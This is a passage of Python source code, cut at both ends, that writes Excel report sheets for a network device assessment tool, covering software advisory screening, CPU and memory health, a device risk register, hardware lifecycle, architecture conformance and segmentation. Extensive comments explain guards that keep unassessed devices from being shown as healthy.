    band_txt = ", ".join(f"{k}: {v}" for k, v in bands.items()) or "—"
    b = ws.cell(1, 1, f"Software risk SCREENING: {s.get('n_findings', 0)} exposed surface(s) on "
                      f"{s.get('n_config_assessable', 0)} of {s.get('n_devices', 0)} config-assessable "
                      "device(s), joined to landmark public advisories. This is configuration-evidence "
                      "screening, NOT a vulnerability scan — validate every running release with the "
                      "Cisco PSIRT Software Checker.")
    b.font = Font(bold=True, color="7030A0", size=10)
    b.alignment = Alignment(horizontal="left", wrap_text=True)
    ws.cell(2, 1, f"Software trains — {band_txt} · {s.get('n_version_known', 0)} of "
                  f"{s.get('n_devices', 0)} version(s) captured").font = Font(size=10)
    SEVFILL = _AXIS_SEV_FILL
    BANDFILL = {"Replace/Upgrade": "F4CCCC", "Verify EoL": "FFF2CC",
                "Current-era": "C6EFCE", "Unknown": "EFEFEF"}
    HDRF = Font(bold=True, color="FFFFFF", size=10)
    DAT = Font(name="Calibri", size=10); MONO = Font(name="Consolas", size=9)

    hdr_row = 4
    cols = ["Device", "Exposed surface", "Severity", "Evidence", "Landmark advisory",
            "Why it matters", "Recommendation"]
    for i, h in enumerate(cols, 1):
        c = ws.cell(hdr_row, i, h); c.font = HDRF
        c.fill = PatternFill("solid", fgColor="7030A0")
        c.alignment = Alignment(horizontal="center", vertical="center", wrap_text=True)
    ws.freeze_panes = ws.cell(hdr_row + 1, 1)
    r = hdr_row + 1
    for f in finds:
        advs = "\n".join(f"{a.get('id')} ({a.get('cve')}) — {a.get('note')}"
                         for a in (f.get("advisories") or [])) or "—"
        vals = [f.get("host"), f.get("surface"), f.get("severity"), f.get("evidence"),
                advs, f.get("why"), f.get("recommendation")]
        for col, v in enumerate(vals, 1):
            c = ws.cell(r, col, v); c.font = (MONO if col in (4, 5) else DAT)
            c.alignment = Alignment(horizontal="center" if col == 3 else "left",
                                    vertical="top", wrap_text=col in (4, 5, 6, 7))
            if col == 3 and v in SEVFILL:
                c.fill = PatternFill("solid", fgColor=SEVFILL[v])
        r += 1
    if not finds:
        ws.cell(r, 1, "No exposed advisory surfaces on the config-assessable devices."
                if s.get("n_config_assessable")
                else "No full running-config captures -- surface screening not assessable.").font = DAT
        r += 1

    r += 2
    ws.cell(r, 1, "Per-device software train (lifecycle screening)").font = Font(bold=True, color="7030A0", size=10)
    r += 1
    cols2 = ["Device", "Platform", "Version", "Train", "Band", "Guidance", "Config captured"]
    for i, h in enumerate(cols2, 1):
        c = ws.cell(r, i, h); c.font = HDRF
        c.fill = PatternFill("solid", fgColor="7030A0")
        c.alignment = Alignment(horizontal="center", vertical="center", wrap_text=True)
    r += 1
    for d in pdev:
        vals = [d.get("host"), d.get("platform"), d.get("sw_version"), d.get("train"),
                d.get("train_band"), d.get("train_note"),
                "yes" if d.get("config_assessable") else "NO"]
        for col, v in enumerate(vals, 1):
            c = ws.cell(r, col, v); c.font = (MONO if col == 3 else DAT)
            c.alignment = Alignment(horizontal="center" if col in (2, 5, 7) else "left",
                                    vertical="top", wrap_text=col == 6)
            if col == 5 and v in BANDFILL:
                c.fill = PatternFill("solid", fgColor=BANDFILL[v])
            if col == 7 and not d.get("config_assessable"):
                c.fill = PatternFill("solid", fgColor="EFEFEF")
        r += 1
    # shared widths: findings table (A-G) wide prose; train table tolerates them.
    for i, w in enumerate([22, 30, 11, 34, 44, 44, 46], 1):
        ws.column_dimensions[chr(64 + i)].width = w
    logger.info(f"  [OK] '{SOFTWARE_RISK_SHEET_NAME}' sheet: {len(finds)} exposed surface(s), "
                f"bands {band_txt}")


PLATFORM_HEALTH_SHEET_NAME = "Platform Health"   # NEW-V3.23.167 (control-plane CPU/memory capacity)

def write_platform_health_sheet(wb, ph: dict) -> None:
    """Write 'Platform Health' from compute_platform_health(): control-plane capacity
    findings (hot/elevated CPU, low memory) and the per-device sample table. The banner
    states the single-sample honesty rule; not-collected devices are declared."""
    if PLATFORM_HEALTH_SHEET_NAME in wb.sheetnames:
        del wb[PLATFORM_HEALTH_SHEET_NAME]
    ws = _new_sheet(wb, PLATFORM_HEALTH_SHEET_NAME)
    p = ph or {}
    finds = p.get("findings") or []
    pdev = p.get("per_device") or []
    s = p.get("summary") or {}
    bands = s.get("bands") or {}
    band_txt = ", ".join(f"{k}: {v}" for k, v in bands.items()) or "—"
    b = ws.cell(1, 1, f"Control-plane capacity screening: {s.get('n_findings', 0)} finding(s) on "
                      f"{s.get('n_collected', 0)} of {s.get('n_devices', 0)} device(s) with capacity "
                      "output. SINGLE point-in-time sample (a snapshot, not a trend) — correlate with "
                      "the Syslog Intelligence sheet and re-sample before the migration window.")
    b.font = Font(bold=True, color="7030A0", size=10)
    b.alignment = Alignment(horizontal="left", wrap_text=True)
    ws.cell(2, 1, f"Bands — {band_txt} · {s.get('n_not_collected', 0)} device(s) without capacity "
                  "output").font = Font(size=10)
    SEVFILL = _AXIS_SEV_FILL   # V3.23.171: this copy had also dropped the Low entry
    BANDFILL = {"Hot": "F4CCCC", "Elevated": "FFF2CC", "OK": "C6EFCE", "Unknown": "EFEFEF"}
    HDRF = Font(bold=True, color="FFFFFF", size=10)
    DAT = Font(name="Calibri", size=10)

    hdr_row = 4
    cols = ["Device", "Finding", "Severity", "Detail", "Recommendation"]
    for i, h in enumerate(cols, 1):
        c = ws.cell(hdr_row, i, h); c.font = HDRF
        c.fill = PatternFill("solid", fgColor="7030A0")
        c.alignment = Alignment(horizontal="center", vertical="center", wrap_text=True)
    ws.freeze_panes = ws.cell(hdr_row + 1, 1)
    r = hdr_row + 1
    for f in finds:
        vals = [f.get("host"), f.get("label"), f.get("severity"), f.get("detail"),
                f.get("recommendation")]
        for col, v in enumerate(vals, 1):
            c = ws.cell(r, col, v); c.font = DAT
            c.alignment = Alignment(horizontal="center" if col == 3 else "left",
                                    vertical="top", wrap_text=col in (4, 5))
            if col == 3 and v in SEVFILL:
                c.fill = PatternFill("solid", fgColor=SEVFILL[v])
        r += 1
    if not finds:
        ws.cell(r, 1, "No capacity findings on the sampled devices." if s.get("n_collected")
                else "No capacity output collected -- platform health not assessable.").font = DAT
        r += 1

    r += 2
    ws.cell(r, 1, "Per-device sample (point-in-time)").font = Font(bold=True, color="7030A0", size=10)
    r += 1
    cols2 = ["Device", "Collected", "CPU 5-min %", "CPU 1-min %", "CPU 5-sec %",
             "Mem total (MB)", "Mem free %", "Band", "Status"]
    for i, h in enumerate(cols2, 1):
        c = ws.cell(r, i, h); c.font = HDRF
        c.fill = PatternFill("solid", fgColor="7030A0")
        c.alignment = Alignment(horizontal="center", vertical="center", wrap_text=True)
    r += 1
    for d in pdev:
        vals = [d.get("host"), "yes" if d.get("collected") else "NOT COLLECTED",
                d.get("cpu_5min"), d.get("cpu_1min"), d.get("cpu_5sec"),
                d.get("mem_total_mb"), d.get("mem_free_pct"), d.get("band"), d.get("status")]
        for col, v in enumerate(vals, 1):
            c = ws.cell(r, col, v if v is not None else "—"); c.font = DAT
            c.alignment = Alignment(horizontal="center" if col in (2, 3, 4, 5, 6, 7, 8) else "left",
                                    vertical="top", wrap_text=col == 9)
            if col == 8 and v in BANDFILL:
                c.fill = PatternFill("solid", fgColor=BANDFILL[v])
            if col == 2 and not d.get("collected"):
                c.fill = PatternFill("solid", fgColor="EFEFEF")
        r += 1
    # shared widths: findings table (A-E) wide prose; sample table spreads A-I.
    for i, w in enumerate([22, 28, 12, 40, 48, 14, 12, 12, 46], 1):
        ws.column_dimensions[chr(64 + i)].width = w
    logger.info(f"  [OK] '{PLATFORM_HEALTH_SHEET_NAME}' sheet: {len(finds)} finding(s), "
                f"bands {band_txt}")


DEVICE_RISK_SHEET_NAME = "Device Risk Register"   # NEW-V3.23.172 (per-asset compound-risk synthesis)

# audit U1-2 (false-health): compute_device_dossiers() correctly ABSTAINS on an axis it has no evidence
# for (state 'na'), and abstention is weighted ZERO in the exposure score. So an asset whose EoL, software
# train, control plane, logs, CIS posture, hygiene, drift and QoS axes were ALL un-assessed scores
# risk_index 0 -> band "Low" -> GREEN fill -> "No stacked risk - routine migration handling." That is a
# collection gap rendered as a clean bill of health. The band is the ENGINE's (never re-derived here), but
# the SHEET must not paint an un-evidenced row the same green as an evidenced one, and it must show the
# n_na the writer previously computed upstream and dropped.
_DOSSIER_COVERAGE_NEUTRAL = "D9D9D9"   # grey: "not assessed", visually distinct from Low's green


# The dossier coverage rule has THREE runtime mirrors -- this function, the explorer's rrCoverage() and
# webapp/frontend/src/pages/Snapshot.tsx's dossierCoverage(). Python, embedded JS and TSX cannot import one
# module, so the rule is CANONICAL here and the drift is caught by execution, not by hope:
# tests/test_explorer_render_safety.py::test_dossier_coverage_rule_is_identical_in_all_three_mirrors drives
# all three implementations over ONE shared case table (DOSSIER_COVERAGE_CASES below) and fails the moment
# any mirror disagrees. Change the rule here and the other two must follow in the same commit.
#
# CASES is data, not documentation: {label: (dossier, expected (n_na, n_axes, thin))}.
DOSSIER_COVERAGE_CASES = {
    # no axis census AT ALL -> the denominator is unknown, so coverage is NOT ASSESSED -> disclose (thin).
    "no_exposures_key":      ({}, (0, 0, True)),
    "exposures_empty_list":  ({"exposures": []}, (0, 0, True)),
    "exposures_not_a_list":  ({"exposures": "na"}, (0, 0, True)),
    "no_census_but_n_na":    ({"n_na": 7}, (7, 0, True)),
    "no_census_n_na_junk":   ({"n_na": "eight"}, (0, 0, True)),
    # a real census: thin iff at least HALF the axes abstained.
    "all_assessed":          ({"exposures": [{"state": "ok"}, {"state": "risk"}]}, (0, 2, False)),
    "one_of_four_na":        ({"exposures": [{"state": "na"}] + [{"state": "ok"}] * 3}, (1, 4, False)),
    "two_of_four_na":        ({"exposures": [{"state": "na"}] * 2 + [{"state": "ok"}] * 2}, (2, 4, True)),
    "all_na":                ({"exposures": [{"state": "na"}] * 3}, (3, 3, True)),
    # a malformed entry is not an axis: the denominator counts only dict axes.
    "junk_entries_dropped":  ({"exposures": [{"state": "na"}, "junk", None]}, (1, 1, True)),
}


def dossier_coverage(d: dict) -> tuple:
    """(n_na, n_axes, thin) for one dossier row.

    `thin` is True when at least half the asset's axes ABSTAINED -- a structural test over the row's own
    axis census, not a list of the bands or hosts that happen to trip it today, so a new abstaining axis
    is covered the day it ships. Tolerant of a malformed/absent `exposures` list.

    FAIL-CLOSED on a MISSING census (review r8 F1). The previous `bool(n_axes and n_na * 2 >= n_axes)`
    evaluated False when `n_axes` was 0 -- i.e. on exactly the input its own fallback branch was written
    for -- so a dossier carrying NO axis data at all reported `thin=False` and rendered as a fully
    assessed asset. That is absence-rendered-as-health inside the guard that exists to close
    absence-rendered-as-health. With no census there is no denominator, so how much of the band rests on
    evidence is itself NOT ASSESSED: disclose it."""
    ax = d.get("exposures")
    axes = [e for e in ax if isinstance(e, dict)] if isinstance(ax, list) else []
    n_axes = len(axes)
    n_na = sum(1 for e in axes if e.get("state") == "na")
    if not n_axes:                                    # no axis census published -> fall back to the count
        try:
            n_na = max(0, int(d.get("n_na") or 0))
        except (TypeError, ValueError):
            n_na = 0
        return n_na, 0, True                          # unknown denominator -> NOT ASSESSED, never "fine"
    return n_na, n_axes, n_na * 2 >= n_axes


def write_device_risk_sheet(wb, dd: dict) -> None:
    """Write 'Device Risk Register' from compute_device_dossiers(): one row per asset with the
    composite risk index (topology impact x stacked exposure), the per-axis red/watch counts and
    the engineer's verdict, then the compound-pattern detail table. The rows arrive pre-ranked
    (riskiest first) -- the sheet preserves that order so row 5 IS the scariest box."""
    if DEVICE_RISK_SHEET_NAME in wb.sheetnames:
        del wb[DEVICE_RISK_SHEET_NAME]
    ws = _new_sheet(wb, DEVICE_RISK_SHEET_NAME)
    d0 = dd or {}
    pdev = d0.get("per_device") or []
    s = d0.get("summary") or {}
    bands = s.get("bands") or {}
    # coverage census over the ROWS (the summary carries no n_na) -- see dossier_coverage() above.
    _cov = [dossier_coverage(d) for d in pdev if isinstance(d, dict)]
    n_thin = sum(1 for _, _, thin in _cov if thin)
    n_half = sum(1 for _, ax, thin in _cov if thin and ax)     # thin WITH a census -> "half or more"
    n_nocensus = sum(1 for _, ax, _ in _cov if not ax)         # thin because there IS no census
    n_na_tot = sum(na for na, _, _ in _cov)
    n_ax_tot = sum(ax for _, ax, _ in _cov)
    n_unassessed = bands.get("Unassessed", 0)
    _gap = ""
    if n_ax_tot:
        _gap = f" COVERAGE: {n_na_tot} of {n_ax_tot} risk axes fleet-wide were NOT ASSESSED (column Q per asset)."
    if n_nocensus:
        _gap += (f" {n_nocensus} asset(s) published NO risk-axis census at all — for those rows how much of the "
                 "band rests on evidence is itself NOT ASSESSED, so they are treated as un-evidenced, never "
                 "as clean.")
    if n_half or n_unassessed:
        _gap += (f" {n_unassessed} asset(s) banded Unassessed and {n_half} asset(s) have HALF OR MORE of their "
                 "risk axes NOT ASSESSED — an abstaining axis scores ZERO exposure, so those rows can band "
                 "'Low' on absent evidence. Read column Q before treating a Low row as clean; not assessed is "
                 "a collection gap, never a clean result.")
    b = ws.cell(1, 1, f"Device Risk Register: {bands.get('Severe', 0)} Severe, "
                      f"{bands.get('Elevated', 0)} Elevated of {s.get('n_devices', 0)} asset(s) · "
                      f"{s.get('n_compound', 0)} compound pattern(s). "
                      "Risk index = topology impact (1-10) × stacked exposure (0-10) — the senior-"
                      "engineer read: independent risks coinciding on one box outrank any single finding."
                      + _gap)
    b.font = Font(bold=True, color="9C0006", size=10)
    b.alignment = Alignment(horizontal="left", wrap_text=True)
    ws.cell(2, 1, d0.get("note", "")).font = Font(size=9, italic=True, color="808080")
    BANDFILL = {"Severe": "F4CCCC", "Elevated": "FCE4D6", "Guarded": "FFF2CC", "Low": "D9EAD3",
                # the engine's own coverage-gap band had NO fill entry, so it rendered blank/neutral
                # by accident rather than by design -- name it.
                "Unassessed": _DOSSIER_COVERAGE_NEUTRAL}
    SEVFILL = _AXIS_SEV_FILL
    HDRF = Font(bold=True, color="FFFFFF", size=10)
    DAT = Font(name="Calibri", size=10)

    hdr_row = 4
    # NB: "Not-assessed axes" is APPENDED (col 17), not inserted next to Red/Watch where it reads better --
    # the column positions of "Compound patterns" (15) and "Engineer's verdict" (16) are pinned by
    # tests/test_device_dossiers.py::test_device_risk_sheet_writer and by downstream readers.
    cols = ["Device", "Model", "Software", "Wave", "Risk index", "Band", "Impact", "Exposure",
            "Red axes", "Watch axes", "Health", "HW EoL", "SW train", "Control plane",
            "Compound patterns", "Engineer's verdict", "Not-assessed axes"]
    for i, h in enumerate(cols, 1):
        c = ws.cell(hdr_row, i, h); c.font = HDRF
        c.fill = PatternFill("solid", fgColor="9C0006")
        c.alignment = Alignment(horizontal="center", vertical="center", wrap_text=True)
    ws.freeze_panes = ws.cell(hdr_row + 1, 1)
    r = hdr_row + 1
    for d in pdev:
        comp = ", ".join(f"{c.get('code', '')}" for c in (d.get("compound") or [])) or "—"
        n_na, n_axes, thin = dossier_coverage(d)
        na_cell = (f"{n_na} of {n_axes} NOT ASSESSED" if n_axes else
                   f"axis census ABSENT — coverage NOT ASSESSED ({n_na} recorded not-assessed)")
        if thin:
            na_cell += " — band computed on absent evidence"
        vals = [d.get("host"), d.get("model") or "—", d.get("sw_version") or "—",
                d.get("wave") or "—", d.get("risk_index"), d.get("risk_band"),
                d.get("impact_score"), d.get("exposure_score"),
                d.get("n_risk"), d.get("n_watch"),
                d.get("health_band") or "—", d.get("eol_band"), d.get("train_band"),
                d.get("platform_band"), comp, d.get("verdict"), na_cell]
        for col, v in enumerate(vals, 1):
            c = ws.cell(r, col, v); c.font = DAT
            c.alignment = Alignment(horizontal="center" if col in (4, 5, 6, 7, 8, 9, 10) else "left",
                                    vertical="top", wrap_text=col in (15, 16, 17))
            if col == 6 and v in BANDFILL:
                # a row whose axes mostly abstained does NOT get the band's reassuring colour: the fill is
                # the fastest read on the sheet and green there is a claim the evidence cannot support.
                c.fill = PatternFill("solid", fgColor=_DOSSIER_COVERAGE_NEUTRAL if thin else BANDFILL[v])
            if col == 17 and thin:
                c.fill = PatternFill("solid", fgColor=_DOSSIER_COVERAGE_NEUTRAL)
                c.font = Font(name="Calibri", size=10, bold=True, color="7F6000")
        r += 1
    if not pdev:
        ws.cell(r, 1, "No per-device axes were computed -- nothing to register.").font = DAT
        r += 1

    r += 2
    ws.cell(r, 1, "Compound patterns (independent risks coinciding on one asset)").font = \
        Font(bold=True, color="9C0006", size=10)
    r += 1
    cols2 = ["Device", "Code", "Pattern", "Severity", "Why it multiplies the concern"]
    for i, h in enumerate(cols2, 1):
        c = ws.cell(r, i, h); c.font = HDRF
        c.fill = PatternFill("solid", fgColor="9C0006")
        c.alignment = Alignment(horizontal="center", vertical="center", wrap_text=True)
    r += 1
    n_comp = 0
    for d in pdev:
        for cp in (d.get("compound") or []):
            vals = [d.get("host"), cp.get("code"), cp.get("title"), cp.get("severity"),
                    cp.get("basis")]
            for col, v in enumerate(vals, 1):
                c = ws.cell(r, col, v); c.font = DAT
                c.alignment = Alignment(horizontal="center" if col in (2, 4) else "left",
                                        vertical="top", wrap_text=col == 5)
                if col == 4 and v in SEVFILL:
                    c.fill = PatternFill("solid", fgColor=SEVFILL[v])
            r += 1
            n_comp += 1
    if not n_comp:
        ws.cell(r, 1, "No compound patterns -- no asset stacks independent risks. "
                      "Single-axis findings live on their own sheets and the punch-list.").font = DAT
    for i, w in enumerate([22, 20, 16, 10, 10, 10, 8, 9, 9, 10, 12, 12, 14, 13, 22, 60, 34], 1):
        ws.column_dimensions[chr(64 + i)].width = w
    logger.info(f"  [OK] '{DEVICE_RISK_SHEET_NAME}' sheet: {len(pdev)} asset(s), "
                f"{n_comp} compound pattern(s), {n_thin} asset(s) banded on mostly-unassessed axes")


LIFECYCLE_RISK_SHEET_NAME = "Lifecycle Risk"   # NEW-V3.23.117 (hardware EoL / end-of-support)

def write_lifecycle_risk_sheet(wb, lr: dict) -> None:
    """Write 'Lifecycle Risk' from compute_lifecycle_risk(): per-device hardware EoL / end-of-support band +
    a platform rollup. Row 1 is a static (date-free) title so the golden sheet schema stays stable."""
    if LIFECYCLE_RISK_SHEET_NAME in wb.sheetnames:
        del wb[LIFECYCLE_RISK_SHEET_NAME]
    ws = _new_sheet(wb, LIFECYCLE_RISK_SHEET_NAME)
    L = lr or {}
    s = L.get("summary") or {}
    ws.cell(1, 1, "Hardware lifecycle (EoL / End-of-Support) — replacement urgency").font = Font(bold=True, size=11)
    ws.cell(2, 1, f"Lifecycle bands as of collection date {L.get('asof', '')}: {s.get('n_past_ldos', 0)} past end-of-support · "
                  f"{s.get('n_near', 0)} within 1yr · {s.get('n_past_eos', 0)} past end-of-sale "
                  f"(LDoS still future; entitlement not inferred) · {s.get('n_active', 0)} pre-EoS date band "
                  f"(schema: Active) · {s.get('n_unknown', 0)} NOT ASSESSED "
                  f"(of {s.get('n_devices', 0)}).").font = Font(size=10)
    ws.cell(3, 1, L.get("note", "")).font = Font(size=9, italic=True, color="808080")
    BANDFILL = {"Past-LDoS": "F4CCCC", "Near-LDoS": "FCE4D6", "Past-EoS": "FFF2CC",
                "Active": "D9EAD3", "Unknown": "EFEFEF"}
    DAT = Font(name="Calibri", size=10)
    r = 5
    ws.cell(r, 1, "By platform").font = Font(bold=True); r += 1
    for i, h in enumerate(["Platform", "Devices", "Band", "LDoS"], 1):
        c = ws.cell(r, i, h); c.font = Font(bold=True, color="FFFFFF", size=10)
        c.fill = PatternFill("solid", fgColor="434343")
    r += 1
    for p in s.get("by_platform", []):
        vals = [p.get("platform"), p.get("count"), p.get("band"), p.get("ldos") or "—"]
        for col, v in enumerate(vals, 1):
            c = ws.cell(r, col, v); c.font = DAT
            if col == 3:
                c.fill = PatternFill("solid", fgColor=BANDFILL.get(v, "FFFFFF"))
        r += 1
    r += 1
    ws.cell(r, 1, "By device").font = Font(bold=True); r += 1
    cols = ["Device", "Model", "Platform", "SW version", "Band", "Status", "EoS", "LDoS", "Source"]
    for i, h in enumerate(cols, 1):
        c = ws.cell(r, i, h); c.font = Font(bold=True, color="FFFFFF", size=10)
        c.fill = PatternFill("solid", fgColor="434343")
        c.alignment = Alignment(horizontal="center", wrap_text=True)
    ws.freeze_panes = ws.cell(r + 1, 1); r += 1
    for d in L.get("per_device", []):
        vals = [d.get("host"), d.get("model"), d.get("platform"), d.get("sw_version"), d.get("band"),
                d.get("status"), d.get("eos") or "—", d.get("ldos") or "—", d.get("source") or "—"]
        for col, v in enumerate(vals, 1):
            c = ws.cell(r, col, v); c.font = DAT
            c.alignment = Alignment(vertical="top", wrap_text=col == 6)
            if col == 5:
                c.fill = PatternFill("solid", fgColor=BANDFILL.get(v, "FFFFFF"))
        r += 1
    for i, w in enumerate([28, 18, 16, 14, 11, 40, 12, 12, 22], 1):
        ws.column_dimensions[chr(64 + i)].width = w
    logger.info(f"  [OK] '{LIFECYCLE_RISK_SHEET_NAME}' sheet: {s.get('n_devices', 0)} device(s), "
                f"{s.get('n_past_ldos', 0)} past-LDoS")


ARCHREVIEW_SHEET_NAME = "Architecture Review"   # NEW-V3.23.161 (leading-practice conformance scorecard)

# verdict -> (display label, fill) — the SAME labels the Architecture Review DOCX renders, so the
# workbook sheet and the report read identically.
_AR_VERDICTS = {"critical": ("CRITICAL DEVIATION", "F4CCCC"), "deviation": ("DEVIATION", "FCE4D6"),
                "advisory": ("ADVISORY", "FFF2CC"), "conforms": ("CONFORMS", "D9EAD3"),
                "not-assessable": ("NOT ASSESSABLE", "EFEFEF")}


def write_architecture_review_sheet(wb, ar: dict) -> None:
    """Write 'Architecture Review' from compute_architecture_review(): the conformance grade, the
    per-domain rollup, the full leading-practice check scorecard and the priority remediation
    queue — the workbook (evidence) twin of the Architecture Review & Conformance Report DOCX.
    Row 1 is a static (date-free) title so the golden sheet schema stays stable."""
    if ARCHREVIEW_SHEET_NAME in wb.sheetnames:
        del wb[ARCHREVIEW_SHEET_NAME]
    ws = _new_sheet(wb, ARCHREVIEW_SHEET_NAME)
    A = _sec_dict(ar)
    # A CRASHED/absent review (the assembly's _unavailable sentinel, or a bare {} with no summary) must NOT
    # render as a clean 'grade N/A · 0 conform · 0 not assessable' scorecard -- that reads as 'reviewed, all
    # fine' when the computation actually failed (false-health). A legit-empty review still carries a summary
    # (n_not_assessable counts the un-evidenced checks), so this only fires on a true compute failure.
    # `not A.get("summary")` caught an absent/empty summary but NOT a TRUTHY NON-dict one, which then
    # crashed on `.get("score_pct")`. Coercing it to {} instead would be worse than the crash: it would
    # render the clean 'grade N/A · 0 conform' scorecard this very guard exists to prevent. An
    # UNREADABLE summary is a failed computation, so it takes the same UNAVAILABLE path.
    if A.get("_unavailable") or not isinstance(A.get("summary"), dict) or not A.get("summary"):
        ws.cell(1, 1, "Architecture Review — leading-practice conformance scorecard").font = Font(bold=True, size=11)
        ws.cell(2, 1, "Architecture review unavailable — the conformance computation did not complete for this "
                      "run; no grade is asserted (see assessment_integrity).").font = Font(size=10)
        return
    s = A["summary"]
    HDR = Font(bold=True, color="FFFFFF", size=10); HFILL = PatternFill("solid", fgColor="434343")
    DAT = Font(name="Calibri", size=10)
    score = s.get("score_pct")
    ws.cell(1, 1, "Architecture Review — leading-practice conformance scorecard").font = \
        Font(bold=True, size=11)
    ws.cell(2, 1, f"Conformance grade {s.get('grade', 'N/A')}"
                  + (f" ({score}%)" if score is not None else "")
                  + f" — {s.get('grade_label', '')}: {s.get('n_conforms', 0)} conform · "
                    f"{s.get('n_advisory', 0)} advisory · {s.get('n_deviation', 0)} deviation · "
                    f"{s.get('n_critical', 0)} critical · "
                    f"{s.get('n_not_assessable', 0)} not assessable.").font = Font(size=10)
    ws.cell(3, 1, s.get("statement", "")).font = Font(size=9, italic=True, color="808080")

    r = 5
    ws.cell(r, 1, "By domain").font = Font(bold=True); r += 1
    for i, h in enumerate(["Domain", "Verdict", "Score"], 1):
        c = ws.cell(r, i, h); c.font = HDR; c.fill = HFILL
    r += 1
    for d in _sec_rows(A.get("domains")):
        label, fill = _AR_VERDICTS.get(d.get("verdict"), (str(d.get("verdict") or "—"), "FFFFFF"))
        sc = d.get("score_pct")
        for col, v in enumerate([d.get("key"), label, f"{sc}%" if sc is not None else "—"], 1):
            c = ws.cell(r, col, v); c.font = DAT
            if col == 2:
                c.fill = PatternFill("solid", fgColor=fill)
        r += 1

    r += 1
    ws.cell(r, 1, "All checks").font = Font(bold=True); r += 1
    cols = ["Check", "Domain", "Title", "Verdict", "Evidence", "Observed", "Recommendation",
            "Reference"]
    for i, h in enumerate(cols, 1):
        c = ws.cell(r, i, h); c.font = HDR; c.fill = HFILL
        c.alignment = Alignment(horizontal="center", wrap_text=True)
    ws.freeze_panes = ws.cell(r + 1, 1); r += 1
    for ck in _sec_rows(A.get("checks")):
        label, fill = _AR_VERDICTS.get(ck.get("verdict"), (str(ck.get("verdict") or "—"), "FFFFFF"))
        vals = [ck.get("id"), ck.get("domain"), ck.get("title"), label,
                ", ".join(str(x) for x in (ck.get("evidence") or [])) or "—",
                ck.get("observed"), ck.get("recommendation"), ck.get("reference")]
        for col, v in enumerate(vals, 1):
            c = ws.cell(r, col, v); c.font = DAT
            c.alignment = Alignment(vertical="top", wrap_text=col >= 5)
            if col == 4:
                c.fill = PatternFill("solid", fgColor=fill)
        r += 1

    queue = _sec_rows(A.get("top_actions"))
    if queue:
        r += 1
        ws.cell(r, 1, "Priority remediation queue (severity, then blast radius)").font = \
            Font(bold=True); r += 1
        for i, h in enumerate(["#", "Check", "Severity", "Action", "Evidence"], 1):
            c = ws.cell(r, i, h); c.font = HDR; c.fill = HFILL
        r += 1
        for a in queue:
            label, fill = _AR_VERDICTS.get(a.get("verdict"), (str(a.get("verdict") or "—"), "FFFFFF"))
            vals = [a.get("rank"), a.get("id"), label, a.get("action"),
                    ", ".join(str(x) for x in (a.get("evidence") or [])) or "—"]
            for col, v in enumerate(vals, 1):
                c = ws.cell(r, col, v); c.font = DAT
                c.alignment = Alignment(vertical="top", wrap_text=col == 4)
                if col == 3:
                    c.fill = PatternFill("solid", fgColor=fill)
            r += 1

    for i, w in enumerate([9, 26, 38, 19, 34, 60, 60, 44], 1):
        ws.column_dimensions[chr(64 + i)].width = w
    logger.info(f"  [OK] '{ARCHREVIEW_SHEET_NAME}' sheet: grade {s.get('grade', 'N/A')}, "
                f"{s.get('n_checks', 0)} check(s), {s.get('n_critical', 0)} critical")


SEGMENTATION_SHEET_NAME = "Segmentation"   # NEW-V3.23.118 (L3 isolation posture)

def write_segmentation_sheet(wb, seg: dict) -> None:
    """Write 'Segmentation' from compute_segmentation(): VRF inventory, gateway-ACL coverage, per-domain
    isolation, and the findings. Row 1 is a static title."""
    if SEGMENTATION_SHEET_NAME in wb.sheetnames:
        del wb[SEGMENTATION_SHEET_NAME]
    ws = _new_sheet(wb, SEGMENTATION_SHEET_NAME)
    g = seg or {}
    s = g.get("summary") or {}
    ga = g.get("gateway_acl") or {}
    HDR = Font(bold=True, color="FFFFFF", size=10); HFILL = PatternFill("solid", fgColor="434343")
    DAT = Font(name="Calibri", size=10)
    flat = bool(s.get("flat"))
    ws.cell(1, 1, "L3 Segmentation & Isolation posture").font = Font(bold=True, size=11)
    ws.cell(2, 1, ("FLAT L3 — " if flat else "") + f"{s.get('n_vrfs', 0)} VRF(s); gateway ACL coverage "
                  f"{ga.get('n_with_acl', 0)}/{ga.get('n_gateways', 0)} ({ga.get('coverage_pct', 0)}%); "
                  f"{s.get('n_oncrit_exposed', 0)} on-air-critical domain(s) not isolated.").font = Font(
        size=10, bold=flat, color="9C0006" if flat else "000000")
    r = [4]

    def section(t):
        ws.cell(r[0], 1, t).font = Font(bold=True); r[0] += 1

    def header(cols):
        for i, h in enumerate(cols, 1):
            c = ws.cell(r[0], i, h); c.font = HDR; c.fill = HFILL
            c.alignment = Alignment(horizontal="center", wrap_text=True)
        r[0] += 1

    section("VRF inventory")
    header(["VRF", "Gateways"])
    for v in g.get("vrfs", []):
        ws.cell(r[0], 1, v.get("vrf")).font = DAT
        ws.cell(r[0], 2, v.get("gateway_count")).font = DAT
        r[0] += 1
    r[0] += 1

    section("Per-domain isolation")
    header(["Domain", "Tier", "Gateways", "VRF(s)", "Gateway ACLs", "Isolated", "Exposure"])
    ISOFILL = {True: "D9EAD3", False: "F4CCCC"}
    for d in g.get("domains", []):
        vals = [d.get("domain"), d.get("tier"), d.get("gateways"), ", ".join(d.get("vrfs") or []),
                d.get("gateways_with_acl"), "yes" if d.get("isolated") else "no", d.get("exposure")]
        for col, v in enumerate(vals, 1):
            c = ws.cell(r[0], col, v); c.font = DAT
            c.alignment = Alignment(vertical="top", wrap_text=col == 7)
            if col == 6:
                c.fill = PatternFill("solid", fgColor=ISOFILL.get(bool(d.get("isolated")), "FFFFFF"))
        r[0] += 1
    r[0] += 1

    section("Findings")
    risks = g.get("risks") or []
    if not risks:
        ws.cell(r[0], 1, "No segmentation findings.").font = DAT; r[0] += 1
    else:
        header(["Severity", "Finding", "Detail", "Remediation"])
        for x in risks:
            vals = [x.get("severity"), x.get("title"), x.get("detail"), x.get("remediation")]
            for col, v in enumerate(vals, 1):
                c = ws.cell(r[0], col, v); c.font = DAT
                c.alignment = Alignment(vertical="top", wrap_text=col in (3, 4))
            r[0] += 1

    for i, w in enumerate([34, 15, 9, 16, 12, 9, 50], 1):
        ws.column_dimensions[chr(64 + i)].width = w
    ws.freeze_panes = "A2"
    logger.info(f"  [OK] '{SEGMENTATION_SHEET_NAME}' sheet: {s.get('n_gateways', 0)} gateway(s), flat={flat}")


PROTOCOL_BOUNDARIES_SHEET_NAME = "Protocol Boundaries"   # protocol-to-protocol analysis (workbook surfacing)

def write_protocol_boundaries_sheet(wb, all_routing_neighbors: dict, all_redistribution: dict) -> None:
    """Write the 'Protocol Boundaries' sheet: per device, the routing protocols it runs, its redistribution
